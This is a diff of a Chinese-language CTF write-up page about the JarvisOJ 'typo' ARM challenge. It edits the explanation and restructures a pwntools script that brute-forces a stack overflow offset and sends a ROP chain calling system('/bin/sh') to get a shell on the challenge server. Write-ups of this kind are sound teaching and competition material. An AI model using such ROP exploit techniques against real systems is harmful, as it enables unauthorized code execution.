@@ -277,7 +277,7 @@ qemu-arm: /build/qemu-c9y6mQ/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Asserti
 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]</span>    <span style="color:#ae81ff">3426</span> segmentation fault  ./typo</code></pre></div>
 <h3 id="思路">思路</h3>
 
-<p>是一个打字游戏, 因为没开栈溢出保护因此想用栈溢出来解决, 果然很快就找到了溢出点, 因为程序中有 /bin/sh 字符串, 所以第一反应是控制返回地址为 system(&ldquo;/bin/sh&rdquo;) 或者利用 rop chain 构造 system(&ldquo;/bin/sh&rdquo;), 因此我们先找一下程序中有没有 system 函数</p>
+<p>是一个打字游戏, 因为没开栈溢出保护因此想用栈溢出来解决, 果然很快就找到了溢出点, 因为程序中有 /bin/sh 字符串, 所以第一反应是控制返回地址为 system(&ldquo;/bin/sh&rdquo;) 或者利用 rop chain 构造 system(&ldquo;/bin/sh&rdquo;), 因为程序是静态链接的, 所以一定会有 system 函数, 只需找到其地址即可</p>
 
 <p>binary 去除了符号表信息, 并不是太容易看出来函数功能, 幸运的是通过在 IDA 中查看 /bin/sh 的交叉引用, 我们能找到调用 system 的函数(sub_10BA8 函数中出现了 /bin/sh, 读过 system 源码的同学可以发现该函数与 system 的流程类似, 于是大胆猜测 sun_10BA8 即为 system, 后来事实证明确实是)</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_110B4</span>(<span style="color:#66d9ef">int</span> a1)
@@ -326,37 +326,43 @@ __Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> pdb
 <span style="color:#75715e">#  context.log_level = &#34;debug&#34;</span>
 
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">150</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
+    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;l&#34;</span>:
+        io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./typo&#34;</span>, timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>)
+    <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;d&#34;</span>:
+        io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;qemu-arm&#34;</span>, <span style="color:#e6db74">&#34;-g&#34;</span>, <span style="color:#e6db74">&#34;1234&#34;</span>, <span style="color:#e6db74">&#34;./typo&#34;</span>])
+    <span style="color:#66d9ef">else</span>:
+        io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn2.jarvisoj.com&#34;</span>, <span style="color:#ae81ff">9888</span>, timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>)
+    
+    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;quit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+    io<span style="color:#f92672">.</span>recvline()
+    
+    <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
+</span><span style="color:#e6db74">    Strings information
+</span><span style="color:#e6db74">    ============================================================
+</span><span style="color:#e6db74">    0x0006c384 : /bin/sh
+</span><span style="color:#e6db74">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only &#34;pop|ret&#34; | grep r0
+</span><span style="color:#e6db74">    0x00020904 : pop {r0, r4, pc}
+</span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
+    
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x20904</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x6c384</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x110B4</span>)
+    success(i)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, payload)
+
+    <span style="color:#75715e">#  pause()</span>
     <span style="color:#66d9ef">try</span>:
-        <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;l&#34;</span>:
-            io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./typo&#34;</span>, timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>)
-        <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;d&#34;</span>:
-            io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;qemu-arm&#34;</span>, <span style="color:#e6db74">&#34;-g&#34;</span>, <span style="color:#e6db74">&#34;1234&#34;</span>, <span style="color:#e6db74">&#34;./typo&#34;</span>])
-        <span style="color:#66d9ef">else</span>:
-            io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn2.jarvisoj.com&#34;</span>, <span style="color:#ae81ff">9888</span>, timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>)
-        
-        io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;quit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-        io<span style="color:#f92672">.</span>recvline()
-        
-        <span style="color:#e6db74">&#39;&#39;&#39;
-</span><span style="color:#e6db74">        jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
-</span><span style="color:#e6db74">        Strings information
-</span><span style="color:#e6db74">        ============================================================
-</span><span style="color:#e6db74">        0x0006c384 : /bin/sh
-</span><span style="color:#e6db74">        jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only &#34;pop|ret&#34; | grep r0
-</span><span style="color:#e6db74">        0x00020904 : pop {r0, r4, pc}
-</span><span style="color:#e6db74">        &#39;&#39;&#39;</span>
-        
-        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x20904</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x6c384</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x110B4</span>)
-        success(i)
-        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, payload)
-        
-        io<span style="color:#f92672">.</span>interactive()
-        <span style="color:#75715e">#  io.close()</span>
-    <span style="color:#66d9ef">except</span>:
-        io<span style="color:#f92672">.</span>close()</code></pre></div>
+        <span style="color:#75715e">#  pdb.set_trace()</span>
+        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;echo aaaa&#34;</span>)
+        io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;aaaa&#34;</span>, timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+        io<span style="color:#f92672">.</span>close()
+        <span style="color:#66d9ef">continue</span>
+    <span style="color:#66d9ef">else</span>:
+        io<span style="color:#f92672">.</span>interactive()</code></pre></div>
 <h2 id="codegate2018-melong">Codegate2018 - melong</h2>
 
 <p><a href="https://github.com/0x01f/pwn_repo/tree/master/Codegate2018_Melong">题目和脚本链接</a></p>
